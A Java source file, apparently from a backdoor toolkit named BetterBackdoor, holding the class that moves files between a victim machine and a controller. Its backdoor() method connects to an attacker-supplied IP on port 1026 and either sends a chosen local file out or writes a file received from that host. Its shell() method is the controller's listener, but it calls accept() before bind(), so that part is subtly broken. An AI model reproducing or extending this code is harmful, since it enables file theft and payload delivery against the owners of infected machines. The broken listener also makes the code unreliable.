package com.github.thatcherdev.betterbackdoor.backend;

import java.io.File;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.net.InetSocketAddress;
import java.net.SocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.FileChannel;
import java.nio.channels.ServerSocketChannel;
import java.nio.channels.SocketChannel;
import java.nio.Buffer;

public class FTP {

	/**
	 * Transfers a file with client.
	 * <p>
	 * Opens {@link java.nio.channels.ServerSocketChannel}
	 * {@link serverSocketChannel} and {@link java.nio.channels.SocketChannel}
	 * {@link socketChannel} for transferring a file with client. If
	 * {@link protocol} is "send", uses {@link #send} to send file with path
	 * {@link filePath} to client. If {@link protocol} is "rec", uses {@link #rec}
	 * to receive file with path {@link filePath} from client.
	 *
	 * @param filePath path of file to transfer
	 * @param protocol if file should be sent or received
	 * @throws IOException
	 */
	public static void shell(String filePath, String protocol) throws IOException {
		
		try(ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();
				SocketChannel socketChannel = serverSocketChannel.accept();)
		{
		serverSocketChannel.socket().bind(new InetSocketAddress(1026));		
		if (protocol.equals("send"))
			send(filePath, socketChannel);
		else if (protocol.equals("rec"))
			rec(filePath, socketChannel);
		}
	}

	/**
	 * Transfers a file with server.
	 * <p>
	 * Opens {@link java.nio.channels.SocketChannel} {@link socketChannel} for
	 * transferring file with server with an IP address of {@link ip}. If
	 * {@link protocol} is "send", uses {@link #send} to send file with path
	 * {@link filePath} to server. If {@link protocol} is "rec", uses {@link #rec}
	 * to receive file with path {@link filePath} from server.
	 * 
	 * @param filePath path of file to transfer
	 * @param protocol if file should be sent or received
	 * @param ip       IP address of server to transfer file with
	 * @throws IOException
	 */
	public static void backdoor(String filePath, String protocol, String ip) throws IOException {
		try(SocketChannel socketChannel = SocketChannel.open();)
		{
		SocketAddress socketAddress = new InetSocketAddress(ip, 1026);
		socketChannel.connect(socketAddress);
		if (protocol.equals("send"))
			send(filePath, socketChannel);
		else if (protocol.equals("rec"))
			rec(filePath, socketChannel);
		}
	}

	/**
	 * Sends file with path {@link filePath} using {@link socketChannel} and
	 * {@link fileChannel}.
	 *
	 * @param filePath      path of file to send
	 * @param socketChannel {@link java.nio.channels.SocketChannel} to use for
	 *                      sending
	 * @throws IOException
	 */
	private static void send(String filePath, SocketChannel socketChannel) throws IOException {
		try (RandomAccessFile file = new RandomAccessFile(new File(filePath), "r");
				FileChannel fileChannel = file.getChannel()) {
			ByteBuffer buffer = ByteBuffer.allocate(1024);
			while (fileChannel.read(buffer) > 0) {
				((Buffer) buffer).flip();
				socketChannel.write(buffer);
				((Buffer) buffer).clear();
			}
		}
	}

	/**
	 * Receives file with path {@link filePath} using {@link socketChannel} and
	 * {@link fileChannel}.
	 *
	 * @param filePath      path of file to receive
	 * @param socketChannel {@link java.nio.channels.SocketChannel} to use for
	 *                      receiving
	 * @throws IOException
	 */
	private static void rec(String filePath, SocketChannel socketChannel) throws IOException {
		
		try(RandomAccessFile file = new RandomAccessFile(filePath, "rw");
				FileChannel fileChannel = file.getChannel();)
		{
		ByteBuffer buffer = ByteBuffer.allocate(1024);
		while (socketChannel.read(buffer) > 0) {
			((Buffer) buffer).flip();
			fileChannel.write(buffer);
			((Buffer) buffer).clear();
		}
		}
	}
}